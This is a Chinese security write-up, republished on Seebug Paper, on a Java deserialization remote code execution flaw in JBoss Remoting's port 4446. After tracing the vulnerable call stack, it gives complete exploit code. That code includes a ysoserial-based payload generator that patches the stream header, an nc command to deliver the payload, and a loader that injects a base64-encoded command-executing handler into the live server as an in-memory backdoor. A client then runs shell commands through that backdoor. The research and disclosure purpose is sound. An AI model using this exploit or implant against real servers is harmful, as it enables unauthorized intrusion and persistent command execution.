@@ -1,0 +1,364 @@
+**作者：Y4er**  
+**原文链接：<https://y4er.com/post/jboss-4446-rce-and-rpc-echo-response/>**
+
+看到推上发了jboss的0day rce，分析一下。
+
+## 前言
+
+![1.png](https://images.seebug.org/content/images/2022/05/09/1652077207000-1udjnh.png-w331s)
+
+这个洞是在国外Alligator Conference 2019会议上的一个议题，ppt在这里
+<https://s3.amazonaws.com/files.joaomatosf.com/slides/alligator_slides.pdf>
+
+议题中讲到了jboss的4446端口反序列化rce，和一条jndi注入的gadget。
+
+## 反序列化rce
+
+jboss默认会开几个端口
+
+端口 | 状态 | 目的  
+---|---|---  
+1098 | 启用 | RMI 命名服务  
+3528 | 已禁用 | IANA 分配的 IIOP 端口  
+4444 | 启用 | RMI JRMP 调用程序  
+4445 | 启用 | RMI 池调用程序  
+4446 | 启用 | 远程服务器连接器  
+4447 | 启用 | 远程服务器连接器  
+4457 | 启用 | 远程服务器连接器  
+4712 | 启用 | JBossTS 恢复管理器  
+4713 | 启用 | JBossTS 事务状态管理器  
+4714 | 启用 | JBossTS 的进程 ID  
+8080 | 启用 | HTTP 连接器  
+8083 | 启用 | RMI 类加载迷你 Web 服务器  
+8443 | 启用 | JBossWS HTTPS 连接器套接字  
+  
+其中4445端口有一个历史RCE cve-2016-3690，是PooledInvokerServlet反序列化。
+
+![2.png](https://images.seebug.org/content/images/2022/05/09/1652077207000-2bzsxi.png-w331s)
+
+这次问题出在4446，这是个Remoting3端口，[官网介绍看这里](https://jbossremoting.jboss.org/remoting-3)，看了看remoting3的文档没写，可以先看2的文档。
+
+这是一个架构图
+
+![3.png](https://images.seebug.org/content/images/2022/05/09/1652077208000-3oxmwk.png-w331s)
+
+直接向4446发送一些数据
+
+![4.png](https://images.seebug.org/content/images/2022/05/09/1652077209000-4jjwjd.png-w331s)
+
+明显的aced0005，但是没有其他的东西了，可能是对数据的解析进行了特殊处理，我们使用api来远程调用一下。
+
+创建一个maven项目，导入jboss remoting2的包，或者从
+https://jbossremoting.jboss.org/downloads.html 直接下载jar包也行。
+
+maven配置参考520师傅的
+
+    
+    
+    <dependency>
+        <groupId>org.jboss.remoting</groupId>
+        <artifactId>jboss-remoting</artifactId>
+        <version>2.5.4.SP5</version>
+    </dependency>
+    <dependency>
+        <groupId>org.jboss.logging</groupId>
+        <artifactId>jboss-logging</artifactId>
+        <version>3.3.0.Final</version>
+    </dependency>
+    <dependency>
+        <groupId>org.jboss</groupId>
+        <artifactId>jboss-common-core</artifactId>
+        <version>2.5.0.Final</version>
+        <exclusions>
+            <exclusion>
+                <groupId>org.jboss.logging</groupId>
+                <artifactId>jboss-logging-spi</artifactId>
+            </exclusion>
+        </exclusions>
+    </dependency>
+    <dependency>
+        <groupId>concurrent</groupId>
+        <artifactId>concurrent</artifactId>
+        <version>1.3.4</version>
+    </dependency>
+
+![5.png](https://images.seebug.org/content/images/2022/05/09/1652077209000-5zlsuu.png-w331s)
+
+客户端先发一个0xaced0005，服务端回复一个0xaced0005，然后客户端发0x77011679…等。其中0x77011679分别表示
+
+    
+    
+    final static byte TC_BLOCKDATA =    (byte)0x77;
+    final static byte SC_WRITE_METHOD = 0x01;
+    0x16 Protocol version 22
+    final static byte TC_RESET =        (byte)0x79;
+
+![6.png](https://images.seebug.org/content/images/2022/05/09/1652077211000-6mffmm.png-w331s)
+
+后面的东西就是payload了，所以我们只需要替换yso生成的payload的前四个字节。
+
+![7.png](https://images.seebug.org/content/images/2022/05/09/1652077212000-7raffs.png-w331s)
+
+4446和3873端?均可利?。
+
+## 调试跟一下
+
+在`org.jboss.remoting.transport.socket.ServerThread#processInvocation`中处理了0x16，读出来协议版本为22
+
+![8.png](https://images.seebug.org/content/images/2022/05/09/1652077213000-8ibibu.png-w331s)
+
+在`org.jboss.remoting.transport.socket.ServerThread#versionedRead`中会调用`this.unmarshaller.read()`
+
+![9.png](https://images.seebug.org/content/images/2022/05/09/1652077214000-9ilsha.png-w331s)
+
+在read中调用java类型的原生反序列化`org.jboss.remoting.serialization.impl.java.JavaSerializationManager#receiveObject`
+
+![10.png](https://images.seebug.org/content/images/2022/05/09/1652077214000-10skqqq.png-w331s)
+
+除了java以外还有别的
+
+![11.png](https://images.seebug.org/content/images/2022/05/09/1652077215000-11ltipj.png-w331s)
+
+最后就进入了readObject
+
+![12.png](https://images.seebug.org/content/images/2022/05/09/1652077215000-12bkkke.png-w331s)
+
+完整的堆栈
+
+    
+    
+    exec:348, Runtime (java.lang)
+    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+    invoke:62, NativeMethodAccessorImpl (sun.reflect)
+    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+    invoke:498, Method (java.lang.reflect)
+    transform:125, InvokerTransformer (org.apache.commons.collections.functors)
+    transform:122, ChainedTransformer (org.apache.commons.collections.functors)
+    get:151, LazyMap (org.apache.commons.collections.map)
+    getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)
+    toString:131, TiedMapEntry (org.apache.commons.collections.keyvalue)
+    readObject:86, BadAttributeValueExpException (javax.management)
+    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+    invoke:62, NativeMethodAccessorImpl (sun.reflect)
+    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+    invoke:498, Method (java.lang.reflect)
+    invokeReadObject:1185, ObjectStreamClass (java.io)
+    readSerialData:2319, ObjectInputStream (java.io)
+    readOrdinaryObject:2210, ObjectInputStream (java.io)
+    readObject0:1690, ObjectInputStream (java.io)
+    readObject:508, ObjectInputStream (java.io)
+    readObject:466, ObjectInputStream (java.io)
+    receiveObjectVersion2_2:238, JavaSerializationManager (org.jboss.remoting.serialization.impl.java)
+    receiveObject:138, JavaSerializationManager (org.jboss.remoting.serialization.impl.java)
+    read:123, SerializableUnMarshaller (org.jboss.remoting.marshal.serializable)
+    versionedRead:900, ServerThread (org.jboss.remoting.transport.socket)
+    completeInvocation:754, ServerThread (org.jboss.remoting.transport.socket)
+    processInvocation:744, ServerThread (org.jboss.remoting.transport.socket)
+    dorun:548, ServerThread (org.jboss.remoting.transport.socket)
+    run:234, ServerThread (org.jboss.remoting.transport.socket)
+
+## rpc调用
+
+研究了一下jboss的remoting，可以写一个类继承自ServerInvocationHandler接口，通过classloader定义到jvm中，然后client查询即可。
+
+关于jboss remoting开发的可以直接看官方的sample，从[这里下载](http://www.jboss.org/file-access/default/members/jbossremoting/downloads/jboss-remoting-2_5_4_SP5.zip)
+
+注册ServerInvocationHandler可以调用`org.jboss.remoting.ServerInvoker#addInvocationHandler`函数，我们需要在线程中找到ServerInvoker的值反射获取以此来动态添加handler。
+
+调试来看在当前线程中就有handler所在的hashmap，所以我们只需要把我们的EvilHandler put进去就行了。
+
+![13.png](https://images.seebug.org/content/images/2022/05/09/1652077216000-13nzzit.png-w331s)
+
+其中ASD就是我的handler
+
+这里直接贴代码，首先需要一个JbossInvocationHandler来执行命令。
+
+    
+    
+    package ysoserial.payloads.templates;
+    
+    import org.jboss.remoting.InvocationRequest;
+    import org.jboss.remoting.ServerInvocationHandler;
+    import org.jboss.remoting.ServerInvoker;
+    import org.jboss.remoting.callback.InvokerCallbackHandler;
+    
+    import javax.management.MBeanServer;
+    
+    public class JbossInvocationHandler implements ServerInvocationHandler, Runnable {
+    
+        @Override
+        public void run() {
+        }
+    
+        @Override
+        public void setMBeanServer(MBeanServer mBeanServer) {
+        }
+    
+        @Override
+        public void setInvoker(ServerInvoker serverInvoker) {
+        }
+    
+        @Override
+        public Object invoke(InvocationRequest invocationRequest) throws Throwable {
+            String cmd = (String) invocationRequest.getParameter();
+            System.out.println("接收到命令：" + cmd);
+            String[] cmds = new String[]{"cmd", "/c", cmd};
+            if (!System.getProperty("os.name").toLowerCase().contains("win")) {
+                cmds = new String[]{"bash", "-c", cmd};
+            }
+            java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmds).getInputStream(), "gbk").useDelimiter("\\A");
+            return s.hasNext() ? s.next() : "no result";
+        }
+    
+        @Override
+        public void addListener(InvokerCallbackHandler invokerCallbackHandler) {
+        }
+    
+        @Override
+        public void removeListener(InvokerCallbackHandler invokerCallbackHandler) {
+        }
+    }
+
+然后base64编码用classloader加载
+
+    
+    
+    package ysoserial.payloads.templates;
+    
+    import org.jboss.remoting.ServerInvocationHandler;
+    import org.jboss.remoting.transport.socket.ServerThread;
+    import org.jboss.remoting.transport.socket.SocketServerInvoker;
+    
+    import java.lang.reflect.Field;
+    import java.lang.reflect.Method;
+    import java.net.URL;
+    import java.net.URLClassLoader;
+    
+    public class Loader {
+        static {
+            try {
+                byte[] bytes = base64Decode("yv66vgAAADIAkAoAIABKCgBLAEwHAE0JAE4ATwcAUAoABQBKCABRCgAFAFIKAAUAUwoAVABVCAA3CABWCABXCgBOAFgKAAMAWQgAWgoAAwBbCABcCABdBwBeCgBfAGAKAF8AYQoAYgBjCABkCgAUAGUIAGYKABQAZwoAFABoCgAUAGkIAGoHAGsHAGwHAG0HAG4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0pib3NzSW52b2NhdGlvbkhhbmRsZXI7AQADcnVuAQAOc2V0TUJlYW5TZXJ2ZXIBACEoTGphdmF4L21hbmFnZW1lbnQvTUJlYW5TZXJ2ZXI7KVYBAAttQmVhblNlcnZlcgEAHkxqYXZheC9tYW5hZ2VtZW50L01CZWFuU2VydmVyOwEACnNldEludm9rZXIBACUoTG9yZy9qYm9zcy9yZW1vdGluZy9TZXJ2ZXJJbnZva2VyOylWAQANc2VydmVySW52b2tlcgEAIkxvcmcvamJvc3MvcmVtb3RpbmcvU2VydmVySW52b2tlcjsBAAZpbnZva2UBADooTG9yZy9qYm9zcy9yZW1vdGluZy9JbnZvY2F0aW9uUmVxdWVzdDspTGphdmEvbGFuZy9PYmplY3Q7AQARaW52b2NhdGlvblJlcXVlc3QBACZMb3JnL2pib3NzL3JlbW90aW5nL0ludm9jYXRpb25SZXF1ZXN0OwEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAA1TdGFja01hcFRhYmxlBwBNBwA6BwBeAQAKRXhjZXB0aW9ucwcAbwEAC2FkZExpc3RlbmVyAQA3KExvcmcvamJvc3MvcmVtb3RpbmcvY2FsbGJhY2svSW52b2tlckNhbGxiYWNrSGFuZGxlcjspVgEAFmludm9rZXJDYWxsYmFja0hhbmRsZXIBADRMb3JnL2pib3NzL3JlbW90aW5nL2NhbGxiYWNrL0ludm9rZXJDYWxsYmFja0hhbmRsZXI7AQAOcmVtb3ZlTGlzdGVuZXIBAApTb3VyY2VGaWxlAQAbSmJvc3NJbnZvY2F0aW9uSGFuZGxlci5qYXZhDAAjACQHAHAMAHEAcgEAEGphdmEvbGFuZy9TdHJpbmcHAHMMAHQAdQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAS5o6l5pS25Yiw5ZG95Luk77yaDAB2AHcMAHgAeQcAegwAewB8AQACL2MBAAdvcy5uYW1lDAB9AH4MAH8AeQEAA3dpbgwAgACBAQAEYmFzaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIHAIIMAIMAhAwAhQCGBwCHDACIAIkBAANnYmsMACMAigEAAlxBDACLAIwMAI0AjgwAjwB5AQAJbm8gcmVzdWx0AQAzeXNvc2VyaWFsL3BheWxvYWRzL3RlbXBsYXRlcy9KYm9zc0ludm9jYXRpb25IYW5kbGVyAQAQamF2YS9sYW5nL09iamVjdAEAKm9yZy9qYm9zcy9yZW1vdGluZy9TZXJ2ZXJJbnZvY2F0aW9uSGFuZGxlcgEAEmphdmEvbGFuZy9SdW5uYWJsZQEAE2phdmEvbGFuZy9UaHJvd2FibGUBACRvcmcvamJvc3MvcmVtb3RpbmcvSW52b2NhdGlvblJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAqKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQAIQAfACAAAgAhACIAAAAHAAEAIwAkAAEAJQAAAC8AAQABAAAABSq3AAGxAAAAAgAmAAAABgABAAAACgAnAAAADAABAAAABQAoACkAAAABACoAJAABACUAAAArAAAAAQAAAAGxAAAAAgAmAAAABgABAAAADgAnAAAADAABAAAAAQAoACkAAAABACsALAABACUAAAA1AAAAAgAAAAGxAAAAAgAmAAAABgABAAAAEgAnAAAAFgACAAAAAQAoACkAAAAAAAEALQAuAAEAAQAvADAAAQAlAAAANQAAAAIAAAABsQAAAAIAJgAAAAYAAQAAABYAJwAAABYAAgAAAAEAKAApAAAAAAABADEAMgABAAEAMwA0AAIAJQAAAQkABAAFAAAAhCu2AALAAANNsgAEuwAFWbcABhIHtgAILLYACLYACbYACga9AANZAxILU1kEEgxTWQUsU04SDbgADrYADxIQtgARmgAWBr0AA1kDEhJTWQQSE1NZBSxTTrsAFFm4ABUttgAWtgAXEhi3ABkSGrYAGzoEGQS2AByZAAsZBLYAHacABRIesAAAAAMAJgAAAB4ABwAAABoACAAbACEAHAA0AB0ARAAeAFcAIABxACEAJwAAADQABQAAAIQAKAApAAAAAACEADUANgABAAgAfAA3ADgAAgA0AFAAOQA6AAMAcQATADsAPAAEAD0AAAAVAAP9AFcHAD4HAD/8ACkHAEBBBwA+AEEAAAAEAAEAQgABAEMARAABACUAAAA1AAAAAgAAAAGxAAAAAgAmAAAABgABAAAAJgAnAAAAFgACAAAAAQAoACkAAAAAAAEARQBGAAEAAQBHAEQAAQAlAAAANQAAAAIAAAABsQAAAAIAJgAAAAYAAQAAACoAJwAAABYAAgAAAAEAKAApAAAAAAABAEUARgABAAEASAAAAAIASQ==");
+                ClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
+                Method defineClass = classLoader.getClass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                defineClass.setAccessible(true);
+                Class invoke = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
+                Object instance = invoke.newInstance();
+    
+                ServerThread serverThread = (ServerThread) Thread.currentThread();
+                Field invoker = serverThread.getClass().getDeclaredField("invoker");
+                invoker.setAccessible(true);
+                SocketServerInvoker invokeObj = (SocketServerInvoker) invoker.get(serverThread);
+                invokeObj.addInvocationHandler("Y4er", (ServerInvocationHandler) instance);
+            } catch (Throwable e) {
+                e.printStackTrace();
+            }
+        }
+    
+        public static byte[] base64Decode(String bs) throws Exception {
+            Class base64;
+            byte[] value = null;
+            try {
+                base64 = Class.forName("java.util.Base64");
+                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+                value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
+            } catch (Exception e) {
+                try {
+                    base64 = Class.forName("sun.misc.BASE64Decoder");
+                    Object decoder = base64.newInstance();
+                    value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
+                } catch (Exception e2) {
+                }
+            }
+            return value;
+        }
+    }
+
+最后用CB183生成payload。
+
+    
+    
+    package ysoserial;
+    
+    import com.google.common.io.Files;
+    import javassist.ClassPool;
+    import javassist.CtClass;
+    import org.apache.commons.codec.binary.Base64;
+    import org.apache.commons.lang.ArrayUtils;
+    import ysoserial.payloads.CommonsBeanutils183NOCC;
+    import ysoserial.payloads.templates.JbossInvocationHandler;
+    
+    import java.io.File;
+    import java.util.Arrays;
+    
+    public class JbossRemoting {
+        public static void main(String[] args) throws Exception {
+            ClassPool pool = ClassPool.getDefault();
+            CtClass ctClass = pool.get(JbossInvocationHandler.class.getName());
+            String s = Base64.encodeBase64String(ctClass.toBytecode());
+            System.out.println(s);
+    
+            Object calc = new CommonsBeanutils183NOCC().getObject("CLASS:Loader");
+            byte[] serialize = Serializer.serialize(calc);
+    
+            byte[] aced = Arrays.copyOfRange(serialize, 0, 4);
+            byte[] range = Arrays.copyOfRange(serialize, 4, serialize.length);
+            byte[] bs = new byte[]{0x77, 0x01, 0x16, 0x79};
+            System.out.println(aced.length + range.length == serialize.length);
+            byte[] bytes = ArrayUtils.addAll(aced, bs);
+            bytes = ArrayUtils.addAll(bytes, range);
+            Files.write(bytes, new File("E:\\tools\\code\\ysoserial\\target\\payload.ser"));
+        }
+    }
+
+然后nc发送
+
+    
+    
+    cat payload.ser |nc 127.0.0.1 4446|hexdump -C
+
+然后新建一个client去执行命令
+
+    
+    
+    package org.jboss.remoting.samples.myclient;
+    
+    import org.jboss.remoting.Client;
+    import org.jboss.remoting.InvokerLocator;
+    
+    public class MyClient {
+        public static void main(String[] args) throws Throwable {
+            InvokerLocator locator = new InvokerLocator("socket://127.0.0.1:4446/");
+            Client client = new Client(locator);
+            client.setSubsystem("Y4er");
+            client.connect();
+            Object as = client.invoke("dir");
+            System.out.println(as);
+            client.disconnect();
+        }
+    }
+
+![14.png](https://images.seebug.org/content/images/2022/05/09/1652077217000-14nxixz.png-w331s)
+
+jboss日志中
+
+![15.png](https://images.seebug.org/content/images/2022/05/09/1652077218000-15fvjww.png-w331s)
+
+## jndi注入
+
+`org.jboss.ejb3.mdb.ProducerManagerImpl#readExternal` 很直观
+
+![16.png](https://images.seebug.org/content/images/2022/05/09/1652077218000-16mgahq.png-w331s)
+
+不详细展开了
+
+## 思考
+
+jboss的rpc有多种传输方式，其内置了几种反序列化方式，其他协议是否会有问题？
+
+jboss的remoting挺有意思，看了官方sample，可以rmi、socket、http等多种方式调用，除了handler是否有其他的回显方式？
+
+* * *
+
+![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
+本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1891/>
+
